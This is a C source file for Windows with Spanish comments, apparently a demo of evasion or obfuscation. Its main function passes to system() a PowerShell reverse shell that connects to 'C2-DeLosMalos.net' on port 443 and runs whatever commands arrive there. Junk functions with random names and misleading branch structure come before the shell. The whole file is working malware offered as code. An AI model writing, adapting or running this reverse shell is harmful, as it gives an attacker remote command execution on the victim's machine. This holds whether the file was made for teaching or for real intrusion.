#include <stdio.h>
#include <windows.h>


// gcc .\bicho.c -o bicho.exe -lws2_32

BOOL aXdf213DS_davcxGD34P()
{
    int i = 33;
    int b;
    if (TRUE)
        b = i * 44;
        return TRUE;
    return FALSE;
}

BOOL asvbCBdgHFjtytyIU()
{
    int i = 33;
    int b;
    if (aXdf213DS_davcxGD34P())
        b = i * 44;
        return FALSE;
    return TRUE;
}


int main(int argc, char **argv)
{
    
    if (aXdf213DS_davcxGD34P() && !asvbCBdgHFjtytyIU())
    {
        // ESTO ESTA SIN OFUSCAR
        printf("esto se ejecutara\n");
        char* cmd = "c:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command '$ip = [System.Net.Dns]::GetHostAddresses(\"C2-DeLosMalos.net\");$client = New-Object System.Net.Sockets.TCPClient($ip,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();'";
        printf("CMD = %s\n", cmd);
        system(cmd);

    }

    /* END */
    printf("Press Any Key to Continue\n");
    getchar();
	return 0;
}
